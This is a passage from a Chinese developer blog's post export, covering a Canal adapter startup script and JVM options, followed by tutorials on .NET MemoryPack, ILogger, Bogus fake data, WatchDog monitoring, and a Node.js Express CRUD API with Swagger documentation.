移除未支持的 JVM 参数-XX:+UseFastAccessorMethods-XX:+PrintAdaptiveSizePolicy-XX:+PrintTenuringDistribution 参考1 去掉 -XX:+AggressiveOpts -XX:-UseBiasedLocking-XX:+UseFastAccessorMethods 去掉str&#x3D;file -L $JAVA | grep 64-bit JAVA_OPTS&#x3D;”$JAVA_OPTS -Xss1m -XX:-OmitStackTraceInFastThrow -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath&#x3D;$base&#x2F;logs”if [ $JavaVersion -ge 11 ] ; then #JAVA_OPTS&#x3D;”$JAVA_OPTS -Xlog:gc*:$base_log&#x2F;gc.log:time “ JAVA_OPTS&#x3D;”$JAVA_OPTS”else #JAVA_OPTS&#x3D;”$JAVA_OPTS -Xloggc:$base&#x2F;logs&#x2F;canal&#x2F;gc.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCApplicationStoppedTime” JAVA_OPTS&#x3D;”$JAVA_OPTS -XX:+PrintAdaptiveSizePolicy -XX:+PrintTenuringDistribution”fi 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#!/bin/bashcurrent_path=`pwd`case &quot;`uname`&quot; in Linux) bin_abs_path=$(readlink -f $(dirname $0)) ;; *) bin_abs_path=`cd $(dirname $0); pwd` ;;esacbase=$&#123;bin_abs_path&#125;/..export LANG=en_US.UTF-8export BASE=$baseif [ -f $base/bin/adapter.pid ] ; then echo &quot;found adapter.pid , Please run stop.sh first ,then startup.sh&quot; 2&gt;&amp;2 exit 1fiif [ ! -d $base/logs ] ; then mkdir -p $base/logsfi## set java pathif [ -z &quot;$JAVA&quot; ] ; then JAVA=$(which java)fiALIBABA_JAVA=&quot;/usr/alibaba/java/bin/java&quot;TAOBAO_JAVA=&quot;/opt/taobao/java/bin/java&quot;if [ -z &quot;$JAVA&quot; ]; then if [ -f $ALIBABA_JAVA ] ; then JAVA=$ALIBABA_JAVA elif [ -f $TAOBAO_JAVA ] ; then JAVA=$TAOBAO_JAVA else echo &quot;Cannot find a Java JDK. Please set either set JAVA or put java (&gt;=1.5) in your PATH.&quot; 2&gt;&amp;2 exit 1 fificase &quot;$#&quot;in0 ) ;;2 ) if [ &quot;$1&quot; = &quot;debug&quot; ]; then DEBUG_PORT=$2 DEBUG_SUSPEND=&quot;n&quot; JAVA_DEBUG_OPT=&quot;-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,address=$DEBUG_PORT,server=y,suspend=$DEBUG_SUSPEND&quot; fi ;;* ) echo &quot;THE PARAMETERS MUST BE TWO OR LESS.PLEASE CHECK AGAIN.&quot; exit;;esacJavaVersion=`$JAVA -version 2&gt;&amp;1 |awk &#x27;NR==1&#123; gsub(/&quot;/,&quot;&quot;); print $3 &#125;&#x27; | awk -F &#x27;.&#x27; &#x27;&#123;print $1&#125;&#x27;`str=`file -L $JAVA | grep 64-bit`JAVA_OPTS=&quot;$JAVA_OPTS -Xss1m -XX:-UseBiasedLocking -XX:-OmitStackTraceInFastThrow -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=$base/logs&quot;if [ $JavaVersion -ge 11 ] ; then #JAVA_OPTS=&quot;$JAVA_OPTS -Xlog:gc*:$base_log/gc.log:time &quot; JAVA_OPTS=&quot;$JAVA_OPTS&quot;else #JAVA_OPTS=&quot;$JAVA_OPTS -Xloggc:$base/logs/canal/gc.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCApplicationStoppedTime&quot; -XX:+UseFastAccessorMethods -XX:+PrintAdaptiveSizePolicy -XX:+PrintTenuringDistribution JAVA_OPTS=&quot;$JAVA_OPTS&quot;fiif [ -n &quot;$str&quot; ]; then if [ $JavaVersion -ge 11 ] ; then # For G1 JAVA_OPTS=&quot;-server -Xms2g -Xmx3g -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:+UseGCOverheadLimit $JAVA_OPTS&quot; else JAVA_OPTS=&quot;-server -Xms2g -Xmx3g -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:+UseGCOverheadLimit $JAVA_OPTS&quot; fielse JAVA_OPTS=&quot;-server -Xms2g -Xmx3g -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:+UseGCOverheadLimit $JAVA_OPTS&quot;fiJAVA_OPTS=&quot; $JAVA_OPTS -Djava.awt.headless=true -Djava.net.preferIPv4Stack=true -Dfile.encoding=UTF-8&quot;ADAPTER_OPTS=&quot;-DappName=canal-adapter&quot;for i in $base/lib/*; do CLASSPATH=$i:&quot;$CLASSPATH&quot;;doneCLASSPATH=&quot;$base/conf:$CLASSPATH&quot;;echo &quot;cd to $bin_abs_path for workaround relative path&quot;cd $bin_abs_pathecho CLASSPATH :$CLASSPATH$JAVA $JAVA_OPTS $JAVA_DEBUG_OPT $ADAPTER_OPTS -classpath .:$CLASSPATH com.alibaba.otter.canal.adapter.launcher.CanalAdapterApplication 1&gt;&gt;/dev/null 2&gt;&amp;1 &amp;echo $! &gt; $base/bin/adapter.pidecho &quot;cd to $current_path for continue&quot;cd $current_path .&#x2F;startup.sh 启动成功log 2024-11-15 16:43:42.033 [main] INFO c.a.o.canal.adapter.launcher.loader.CanalAdapterLoader - Start adapter for canal-client mq topic: example-g1 succeed2024-11-15 16:43:42.034 [main] INFO c.a.o.canal.adapter.launcher.loader.CanalAdapterService - ## the canal client adapters are running now ……2024-11-15 16:43:42.035 [Thread-3] INFO c.a.otter.canal.adapter.launcher.loader.AdapterProcessor - &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; Start to connect destination: example &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;2024-11-15 16:43:42.047 [main] INFO c.a.otter.canal.adapter.launcher.CanalAdapterApplication - Started CanalAdapterApplication in 1.721 seconds (JVM running for 2.038)2024-11-15 16:43:42.109 [Thread-3] INFO c.a.otter.canal.adapter.launcher.loader.AdapterProcessor - &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; Subscribe destination: example succeed &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 插入原sql则可以看到 canal的数据库也插入在主库test数据库下的user表中插入数据，查看canal所在数据库test下的user表中是否同步。 Canal 依赖主键或唯一键来确定同步数据如果有新增唯一键，则也需要bak到备份的数据库中才能正确备份","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://banjinmei.github.io/tags/mysql/"},{"name":"canal","slug":"canal","permalink":"https://banjinmei.github.io/tags/canal/"}],"author":"mu"},{"title":".NET MemoryPack","slug":"NET-MemoryPack","date":"2024-11-13T16:57:37.000Z","updated":"2024-11-13T16:59:25.442Z","comments":true,"path":"2024/11/14/NET-MemoryPack/","permalink":"https://banjinmei.github.io/2024/11/14/NET-MemoryPack/","excerpt":"","text":"MemoryPack是一个高效的数据序列化库，它专注于性能优化，适用于需要快速序列化和反序列化的场景。这个库是由 Yuki Yogo 开发的，并且在 .NET 社区中获得了相当的关注。MemoryPack 支持零拷贝（zero-copy）读取，这意味着可以在不需要额外内存分配的情况下直接从原始字节数据中读取值。 MemoryPack使用示例，包括定义一个可序列化的类、序列化对象以及反序列化回对象的过程。 安装 MemoryPack首先，需要安装 MemoryPack 库。可以通过 NuGet 包管理器来安装： 1dotnet add package MemoryPack 或者在 Visual Studio 中使用 NuGet 包管理器界面来安装。 定义可序列化的类为了使一个类能够被 MemoryPack 序列化，需要为该类添加 [MemoryPackable] 属性，并为类中的每个字段或属性添加 [MemoryPackIgnore] 属性（如果想要忽略某些字段或属性的话）。这里有一个简单的例子： 1234567891011121314using System;using MemoryPack;[MemoryPackable]public partial class Person&#123; public string Name &#123; get; set; &#125; public int Age &#123; get; set; &#125; [MemoryPackIgnore] public string NotSerializedProperty &#123; get; set; &#125;&#125; 注意：partial 关键字是必须的，因为 MemoryPack 在编译时会生成一些额外的代码来支持序列化&#x2F;反序列化。 序列化和反序列化接下来，我们可以创建一个 Person 对象，然后使用 MemoryPack 将其序列化为字节数组，再从字节数组反序列化回 Person 对象。 1234567891011121314151617181920212223242526using System;using MemoryPack;class Program&#123; static void Main() &#123; // 创建一个 Person 实例 var person = new Person &#123; Name = &quot;John Doe&quot;, Age = 30, NotSerializedProperty = &quot;This will not be serialized&quot; &#125;; // 序列化 byte[] serialized = MemoryPackSerializer.Serialize(person); // 反序列化 （零拷贝） Person deserializedPerson = MemoryPackSerializer.Deserialize&lt;Person&gt;(serialized); // 输出结果 Console.WriteLine($&quot;Name: &#123;deserializedPerson.Name&#125;, Age: &#123;deserializedPerson.Age&#125;&quot;); // 注意：NotSerializedProperty 不会被输出，因为它没有被序列化 &#125;&#125; 注意事项MemoryPack 支持大多数基本类型和复杂类型，但是也有一些限制，例如不支持循环引用的对象图。如果的项目中存在多个需要序列化的类，每个类都需要标记 [MemoryPackable] 并且是 partial 类型。由于 MemoryPack 使用了源生成器（source generators），因此它在编译时会生成额外的代码，这可能会稍微增加构建时间，但可以显著提高运行时的性能。以上就是一个使用 MemoryPack 进行序列化和反序列化的简单示例。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":".NET ILogger","slug":"NET-ILogger","date":"2024-11-13T16:55:06.000Z","updated":"2024-11-13T16:56:46.669Z","comments":true,"path":"2024/11/14/NET-ILogger/","permalink":"https://banjinmei.github.io/2024/11/14/NET-ILogger/","excerpt":"","text":"ILogger 是 ASP.NET Core 中的一个接口，用于记录应用程序的日志信息。它是一个泛型接口，其中 T 是日志记录的上下文类型。通常情况下，会使用 ILogger 接口而不是 ILogger，除非需要将特定的上下文类型传递给日志记录器。 ILogger 的示例： 1. 注入 ILogger在的控制器、服务或其他依赖注入组件中，可以注入 ILogger 或 ILogger。例如，在控制器中注入 ILogger： 1234567891011public class YourController : ControllerBase&#123; private readonly ILogger&lt;YourController&gt; _logger; public YourController(ILogger&lt;YourController&gt; logger) &#123; _logger = logger; &#125; // ...&#125; 或者，如果不需要特定的上下文类型，可以注入 ILogger： 1234567891011public class YourService&#123; private readonly ILogger _logger; public YourService(ILogger logger) &#123; _logger = logger; &#125; // ...&#125; 2. 记录日志使用 _logger 对象记录不同级别的日志，例如： 123_logger.LogInformation(&quot;This is an information message.&quot;);_logger.LogWarning(&quot;This is a warning message.&quot;);_logger.LogError(&quot;This is an error message.&quot;, exception); 3. 配置日志记录在 appsettings.json 或其他配置文件中配置日志记录级别和输出目标。例如，在 appsettings.Development.json 中： 123456789&#123; &quot;Logging&quot;: &#123; &quot;LogLevel&quot;: &#123; &quot;Default&quot;: &quot;Debug&quot;, &quot;System&quot;: &quot;Information&quot;, &quot;Microsoft&quot;: &quot;Warning&quot; &#125; &#125;&#125; 这将设置默认日志级别为 Debug，系统日志级别为 Information，Microsoft 日志级别为 Warning。 还可以配置日志记录器将日志输出到控制台、文件或其他目标。例如，在 appsettings.json 中： 123456789101112131415161718192021222324252627&#123; &quot;Logging&quot;: &#123; &quot;Console&quot;: &#123; &quot;IncludeScopes&quot;: false, &quot;Debug&quot;: &#123; &quot;LogLevel&quot;: &#123; &quot;Default&quot;: &quot;Information&quot; &#125; &#125;, &quot;Info&quot;: &#123; &quot;LogLevel&quot;: &#123; &quot;Default&quot;: &quot;Warning&quot; &#125; &#125;, &quot;Warning&quot;: &#123; &quot;LogLevel&quot;: &#123; &quot;Default&quot;: &quot;Error&quot; &#125; &#125;, &quot;Error&quot;: &#123; &quot;LogLevel&quot;: &#123; &quot;Default&quot;: &quot;Critical&quot; &#125; &#125; &#125; &#125;&#125; 这将配置控制台日志记录器，并为不同级别的日志设置不同的输出级别。 总之，ILogger 和 ILogger 提供了一种灵活且强大的方式来记录应用程序的日志信息。通过配置不同的日志级别和输出目标，可以轻松地满足各种日志记录需求。 日志级别和分类：ILogger 提供了日志级别的概念，如 Trace、Debug、Info、Warning、Error 和 Critical。这允许开发者根据需要记录不同严重程度的信息，并且可以在配置中设置日志级别，以便在不同环境中（如开发、测试、生产）显示或隐藏某些级别的日志。Console.WriteLine 只是简单地将文本输出到控制台，没有日志级别的概念。 可配置性：ILogger 是可配置的，可以配置日志记录器将日志输出到不同的目标（如文件、数据库、网络服务等），并且可以设置不同的格式化选项。Console.WriteLine 只是将输出发送到控制台，没有可配置的输出目标或格式化选项。 结构化日志：ILogger 支持结构化日志记录，这意味着可以记录包含键值对的对象，这些对象可以更容易地被日志分析工具解析和查询。Console.WriteLine 只能输出文本字符串，不支持结构化日志。 集成和扩展性：ILogger 是 ASP.NET Core 和许多其他 .NET 应用程序框架的一部分，它与其他框架组件（如依赖注入、中间件等）集成良好，并且可以通过第三方库轻松扩展。Console.WriteLine 是 .NET 基础类库的一部分，但它不特定于任何特定的应用程序框架，也没有集成的概念。 异常处理：使用 ILogger 记录异常时，可以将异常对象作为参数传递，这样日志记录器可以捕获并记录异常的详细信息。Console.WriteLine 只能手动将异常信息转换为字符串，然后输出。 总结： ILogger 提供了更丰富的日志记录功能，包括日志级别、可配置性、结构化日志支持以及与框架的良好集成。Console.WriteLine 更简单易用，适用于快速原型开发或简单的日志记录需求。在大多数情况下，对于生产环境中的应用程序，推荐使用 ILogger，因为它提供了更多的灵活性和控制能力。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":"Bogus-.NET Fake Data","slug":"Bogus-NET-Fake-Data","date":"2024-11-10T13:09:29.000Z","updated":"2024-11-27T14:47:03.933Z","comments":true,"path":"2024/11/10/Bogus-NET-Fake-Data/","permalink":"https://banjinmei.github.io/2024/11/10/Bogus-NET-Fake-Data/","excerpt":"","text":"Bogus快速生成模拟数据适用于单元测试、原型设计、演示数据准备。 1.NuGet 安装 Bogus2.简单使用12345678910111213141516 var faker = new Faker();// var faker = new Faker(&quot;zh_CN&quot;); ////中文 Console.WriteLine($&quot;Name: &#123;faker.Name.FullName()&#125;&quot;); Console.WriteLine($&quot;Email: &#123;faker.Internet.Email()&#125;&quot;); Console.WriteLine($&quot;Phone: &#123;faker.Phone.PhoneNumber()&#125;&quot;); Console.WriteLine($&quot;Address: &#123;faker.Address.FullAddress()&#125;&quot;); Console.WriteLine($&quot;Company: &#123;faker.Company.CompanyName()&#125;&quot;); Console.WriteLine($&quot;Catch Phrase: &#123;faker.Company.CatchPhrase()&#125;&quot;); Console.WriteLine($&quot;BS: &#123;faker.Company.Bs()&#125;&quot;); Console.WriteLine($&quot;Product: &#123;faker.Commerce.Product()&#125;&quot;); Console.WriteLine($&quot;Price: &#123;faker.Commerce.Price()&#125;&quot;); Console.WriteLine($&quot;Credit Card: &#123;faker.Finance.CreditCardNumber()&#125;&quot;); Console.WriteLine($&quot;Bitcoin Address: &#123;faker.Finance.BitcoinAddress()&#125;&quot;); Console.WriteLine($&quot;User Agent: &#123;faker.Internet.UserAgent()&#125;&quot;); Console.WriteLine($&quot;Color: &#123;faker.Commerce.Color()&#125;&quot;); Console.WriteLine($&quot;Time Zone: &#123;faker.Date.TimeZoneString()&#125;&quot;); 3.自定义类使用12345678910111213141516171819202122232425 public class TUser &#123; public int Id &#123; get; set; &#125; public string FirstName &#123; get; set; &#125; public string LastName &#123; get; set; &#125; public string Email &#123; get; set; &#125; public DateTime Birth &#123; get; set; &#125; &#125;//模拟数据 var faker = new Faker&lt;TUser&gt;().RuleFor(u =&gt; u.Id, f =&gt; f.Random.Int(1, 9999)) .RuleFor(u =&gt; u.FirstName, f =&gt; f.Name.FirstName()) .RuleFor(u =&gt; u.LastName, f =&gt; f.Name.LastName()) .RuleFor(u =&gt; u.Email, (f, u) =&gt; f.Internet.Email(u.FirstName, u.LastName)) .RuleFor(u =&gt; u.Birth, f =&gt; f.Date.Past(50)); TUser user = faker.Generate(); Console.WriteLine($&quot;Id: &#123;user.Id&#125;&quot;); Console.WriteLine($&quot;Name: &#123;user.FirstName&#125; &#123;user.LastName&#125;&quot;); Console.WriteLine($&quot;Email: &#123;user.Email&#125;&quot;); Console.WriteLine($&quot;Date of Birth: &#123;user.Birth:d&#125;&quot;);//模拟多个 List&lt;TUser&gt; users = faker.Generate(10);//10count foreach (var user in users) &#123; Console.WriteLine($&quot;&#123;user.FirstName&#125; &#123;user.LastName&#125; (&#123;user.Email&#125;)&quot;); &#125; 4.复杂对象1234567891011121314151617181920212223242526272829303132333435363738394041 public class TOrderItem &#123; public string ProductName &#123; get; set; &#125; public int Quantity &#123; get; set; &#125; public decimal Price &#123; get; set; &#125; &#125; public class TOrder &#123; public int Id &#123; get; set; &#125; public TUser Customer &#123; get; set; &#125; public DateTime OrderDate &#123; get; set; &#125; public List&lt;TOrderItem&gt; Items &#123; get; set; &#125; public decimal TotalAmount &#123; get; set; &#125; &#125;//模拟数据 var userFaker = new Faker&lt;TUser&gt;() .RuleFor(u =&gt; u.Id, f =&gt; f.Random.Int(1, 999)) .RuleFor(u =&gt; u.FirstName, f =&gt; f.Name.FirstName()) .RuleFor(u =&gt; u.LastName, f =&gt; f.Name.LastName()) .RuleFor(u =&gt; u.Email, (f, u) =&gt; f.Internet.Email(u.FirstName, u.LastName)); var orderItemFaker = new Faker&lt;TOrderItem&gt;() .RuleFor(oi =&gt; oi.ProductName, f =&gt; f.Commerce.ProductName()) .RuleFor(oi =&gt; oi.Quantity, f =&gt; f.Random.Int(1, 888)) .RuleFor(oi =&gt; oi.Price, f =&gt; decimal.Parse(f.Commerce.Price())); var orderFaker = new Faker&lt;TOrder&gt;() .RuleFor(o =&gt; o.Id, f =&gt; f.Random.Int(10000, 99999)) .RuleFor(o =&gt; o.Customer, f =&gt; userFaker.Generate()) .RuleFor(o =&gt; o.OrderDate, f =&gt; f.Date.Recent(30)) .RuleFor(o =&gt; o.Items, f =&gt; orderItemFaker.Generate(f.Random.Int(1, 5))) .RuleFor(o =&gt; o.TotalAmount, (f, o) =&gt; o.Items.Sum(i =&gt; i.Price * i.Quantity)); TOrder order = orderFaker.Generate(); Console.WriteLine($&quot;Order ID: &#123;order.Id&#125;&quot;); Console.WriteLine($&quot;Customer: &#123;order.Customer.FirstName&#125; &#123;order.Customer.LastName&#125;&quot;); // Console.WriteLine($&quot;Order Date: &#123;order.OrderDate:d&#125;&quot;); Console.WriteLine(&quot;Items:&quot;); foreach (var item in order.Items) &#123; Console.WriteLine($&quot; &#123;item.ProductName&#125; - Quantity: &#123;item.Quantity&#125;, Price: &#123;item.Price:C&#125;&quot;); &#125; Console.WriteLine($&quot;Total Amount: &#123;order.TotalAmount:C&#125;&quot;); 5.seed值确保每次生成的值相同 12var faker = new Faker(&quot;zh_CN&quot;); faker.Random = new Randomizer(123);//seed 123Console.WriteLine(faker.Name.FullName()); 6.国际化locales 12345var fakerEs = new Faker(&quot;es&quot;); Console.WriteLine($&quot;Spanish name: &#123;fakerEs.Name.FullName()&#125;&quot;);var fakerDe = new Faker(&quot;de&quot;); Console.WriteLine($&quot;German name: &#123;fakerDe.Name.FullName()&#125;&quot;);var fakerFr = new Faker(&quot;fr&quot;); Console.WriteLine($&quot;French name: &#123;fakerFr.Name.FullName()&#125;&quot;);var fakerRu = new Faker(&quot;zh_TW&quot;); Console.WriteLine($&quot;TW name: &#123;fakerRu.Name.FullName()&#125;&quot;);var fakerJP = new Faker(&quot;ja&quot;); Console.WriteLine($&quot;JP name: &#123;fakerJP.Name.FullName()&#125;&quot;); 7.定义规则1234.RuleSet(&quot;adult&quot;, set =&gt; &#123; set.RuleFor(u =&gt; u.Birth, f =&gt; f.Date.Past(35, DateTime.Now.AddYears(-16)));&#125;); 用户的出生日期被限定为当前时间往前推35年到16年之间的随机日期，这样生成的用户就是35岁内的成年人。&#x2F;&#x2F;Born: {adultUser.Birth:d}","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":".NET WatchDog","slug":"NET-WatchDog","date":"2024-11-08T16:01:03.000Z","updated":"2024-11-19T14:08:03.314Z","comments":true,"path":"2024/11/09/NET-WatchDog/","permalink":"https://banjinmei.github.io/2024/11/09/NET-WatchDog/","excerpt":"","text":"WatchDog是一个开源（MIT License）、免费的实时应用监控系统，它可以实时记录并查看应用中的消息、事件、HTTP 请求和响应，以及运行时捕获的异常。 功能特点实时日志记录：能够实时记录HTTP请求、响应以及运行时捕获的异常。代码内日志记录：支持在代码中记录消息和事件。日志搜索功能：支持对HTTP请求和异常日志进行搜索。HTTP日志筛选：可根据HTTP方法和状态码筛选HTTP日志。报警通知：支持通过邮件、短信等多种方式发送报警通知，确保能够及时得到反馈。灵活配置：可以根据应用需求进行灵活的配置，适应不同的监控需求。使用正则表达式黑名单 ：新增了使用正则表达式进行黑名单过滤的功能。 工作原理WatchDog 利用 SignalR 实现了实时监控，并使用LiteDb作为无需配置的类似MongoDB的服务器端数据库，同时也支持使用外部数据库（如MSSQL、MySQL、PostgreSQL、MongoDB）。 使用 WatchDog首先，在项目中安装 WatchDog 包。 NuGet 包管理器中安装：1dotnet add package WatchDog 在 Startup.cs 中配置 WatchDog：在 ConfigureServices 方法中添加 WatchDog： 12345678public void ConfigureServices(IServiceCollection services)&#123; services.AddControllers(); // 添加 WatchDog 服务 services.AddWatchDogServices();&#125; 然后，在 Configure 方法中配置它： 12345678910111213141516171819202122232425public void Configure(IApplicationBuilder app, IWebHostEnvironment env)&#123; if (env.IsDevelopment()) &#123; app.UseDeveloperExceptionPage(); &#125; app.UseHttpsRedirection(); app.UseRouting(); app.UseAuthorization(); app.UseEndpoints(endpoints =&gt; &#123; endpoints.MapControllers(); &#125;); // 配置 WatchDog 中间件，指定 API 日志查看的访问路径和安全选项 app.UseWatchDog(opt =&gt; &#123; opt.WatchPageUsername = &quot;admin&quot;; // 设置用户名 opt.WatchPagePassword = &quot;password&quot;; // 设置密码 opt.Blacklist = new List&lt;string&gt; &#123; &quot;/health&quot; &#125;; // 不记录特定路径 &#125;);&#125; 控制器中记录日志WatchDog 会自动记录所有 API 请求和响应，如果你想手动记录特定的事件或日志，可以使用 WatchLogger。 12345678910111213141516using WatchDog;[ApiController][Route(&quot;[controller]&quot;)]public class SampleController : ControllerBase&#123; [HttpGet(&quot;test&quot;)] public IActionResult TestEndpoint() &#123; // 手动记录日志 WatchLogger.Log(&quot;This is a manual log message&quot;); return Ok(&quot;Test endpoint&quot;); &#125;&#125; 查看日志启动应用后，打开浏览器，访问 https:&#x2F;&#x2F;&#x2F;watchdog (例如，https://localhost:5001/watchdog) ，输入配置的用户名和密码即可查看日志。 注意事项在生产环境中使用时，请确保设置合适的访问权限以保护日志。使用 Blacklist 配置可以避免记录不需要的路由。这样就可以通过 WatchDog 轻松记录和查看 API 请求和响应日志。 接口401 401检查中间件顺序UseWatchDog 的中间件需要在 app.UseEndpoints 或 app.MapControllers 之前添加。确保中间件的调用顺序正确，例如： 12345678910111213141516app.UseRouting();app.UseAuthentication();app.UseAuthorization();app.UseWatchDog(opt =&gt;&#123; opt.WatchPageUsername = &quot;admin&quot;; opt.WatchPagePassword = &quot;password&quot;;&#125;);app.UseEndpoints(endpoints =&gt;&#123; endpoints.MapControllers();&#125;);","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":"Node Swagger","slug":"Node-Swagger","date":"2024-11-06T16:37:19.000Z","updated":"2024-11-06T16:39:20.329Z","comments":true,"path":"2024/11/07/Node-Swagger/","permalink":"https://banjinmei.github.io/2024/11/07/Node-Swagger/","excerpt":"","text":"Node.js 和 Swagger 创建简单增删改查 (CRUD) API ， 使用 Express 作为 Web 框架，并集成 Swagger UI 来自动生成 API 文档。 1234mkdir node-swagger-crudcd node-swagger-crudnpm init -ynpm install express swagger-jsdoc swagger-ui-express 2: 设置 Express 应用创建一个文件 app.js，用于定义 Express 应用及基本路由。 123456789101112131415161718192021222324252627282930313233// app.jsconst express = require(&quot;express&quot;);const app = express();app.use(express.json()); // 解析 JSON 请求const swaggerJsDoc = require(&quot;swagger-jsdoc&quot;);const swaggerUi = require(&quot;swagger-ui-express&quot;);// Swagger 配置const swaggerOptions = &#123; swaggerDefinition: &#123; openapi: &quot;3.0.0&quot;, info: &#123; title: &quot;Simple CRUD API&quot;, version: &quot;1.0.0&quot;, description: &quot;A simple CRUD API with Swagger documentation&quot;, &#125;, &#125;, apis: [&quot;./routes/*.js&quot;],&#125;;const swaggerDocs = swaggerJsDoc(swaggerOptions);app.use(&quot;/api-docs&quot;, swaggerUi.serve, swaggerUi.setup(swaggerDocs));// 引入 CRUD 路由const itemsRouter = require(&quot;./routes/items&quot;);app.use(&quot;/api/items&quot;, itemsRouter);const PORT = process.env.PORT || 3000;app.listen(PORT, () =&gt; &#123; console.log(`Server running on http://localhost:$&#123;PORT&#125;`); console.log(`Swagger docs available on http://localhost:$&#123;PORT&#125;/api-docs`);&#125;); 3: 创建 CRUD 路由在项目根目录下创建 routes 文件夹，并在其中创建 items.js 文件，定义 CRUD 操作接口。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162// routes/items.jsconst express = require(&quot;express&quot;);const router = express.Router();let items = []; // 模拟数据库中的数据/** * @swagger * components: * schemas: * Item: * type: object * required: * - name * properties: * id: * type: integer * description: The auto-generated id of the item * name: * type: string * description: The name of the item * example: * id: 1 * name: Sample Item *//** * @swagger * /api/items: * get: * summary: 获取所有 items * tags: [Items] * responses: * 200: * description: The list of items * content: * application/json: * schema: * type: array * items: * $ref: &#x27;#/components/schemas/Item&#x27; */router.get(&quot;/&quot;, (req, res) =&gt; &#123; res.json(items);&#125;);/** * @swagger * /api/items/&#123;id&#125;: * get: * summary: 获取单个 item * tags: [Items] * parameters: * - in: path * name: id * schema: * type: integer * required: true * description: Item ID * responses: * 200: * description: Item data * content: * application/json: * schema: * $ref: &#x27;#/components/schemas/Item&#x27; * 404: * description: Item not found */router.get(&quot;/:id&quot;, (req, res) =&gt; &#123; const item = items.find((i) =&gt; i.id === parseInt(req.params.id)); if (!item) return res.status(404).send(&quot;Item not found&quot;); res.json(item);&#125;);/** * @swagger * /api/items: * post: * summary: 创建一个新的 item * tags: [Items] * requestBody: * required: true * content: * application/json: * schema: * $ref: &#x27;#/components/schemas/Item&#x27; * responses: * 201: * description: Item created */router.post(&quot;/&quot;, (req, res) =&gt; &#123; const item = &#123; id: items.length + 1, name: req.body.name, &#125;; items.push(item); res.status(201).json(item);&#125;);/** * @swagger * /api/items/&#123;id&#125;: * put: * summary: 更新指定 ID 的 item * tags: [Items] * parameters: * - in: path * name: id * schema: * type: integer * required: true * description: Item ID * requestBody: * required: true * content: * application/json: * schema: * $ref: &#x27;#/components/schemas/Item&#x27; * responses: * 200: * description: Item updated * 404: * description: Item not found */router.put(&quot;/:id&quot;, (req, res) =&gt; &#123; const item = items.find((i) =&gt; i.id === parseInt(req.params.id)); if (!item) return res.status(404).send(&quot;Item not found&quot;); item.name = req.body.name; res.json(item);&#125;);/** * @swagger * /api/items/&#123;id&#125;: * delete: * summary: 删除指定 ID 的 item * tags: [Items] * parameters: * - in: path * name: id * schema: * type: integer * required: true * description: Item ID * responses: * 200: * description: Item deleted * 404: * description: Item not found */router.delete(&quot;/:id&quot;, (req, res) =&gt; &#123; const itemIndex = items.findIndex((i) =&gt; i.id === parseInt(req.params.id)); if (itemIndex === -1) return res.status(404).send(&quot;Item not found&quot;); items.splice(itemIndex, 1); res.send(&quot;Item deleted&quot;);&#125;);module.exports = router; 4: 启动服务器1node app.js 访问 http://localhost:3000/api-docs，可以查看生成的 Swagger 文档。 测试 API以下是 API 接口的示例请求： 获取所有 items: GET http://localhost:3000/api/items获取单个 item: GET http://localhost:3000/api/items/{id}创建 item: POST http://localhost:3000/api/items，JSON 数据 { “name”: “New Item” }更新 item: PUT http://localhost:3000/api/items/{id}，JSON 数据 { “name”: “Updated Item” }删除 item: DELETE http://localhost:3000/api/items/{id} 这样，一个简单的 CRUD 接口及其文档就构建完成了！","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"swagger","slug":"swagger","permalink":"https://banjinmei.github.io/tags/swagger/"}],"author":"mu"},{"title":"Rspack Vue3","slug":"Rspack-Vue3","date":"2024-11-06T16:31:15.000Z","updated":"2024-11-06T16:36:49.259Z","comments":true,"path":"2024/11/07/Rspack-Vue3/","permalink":"https://banjinmei.github.io/2024/11/07/Rspack-Vue3/","excerpt":"","text":"Rspack+Vue3+TS 项目环境构建到实战Rspack是什么?Rspack是一个基于 Rust 编写的高性能JavaScript 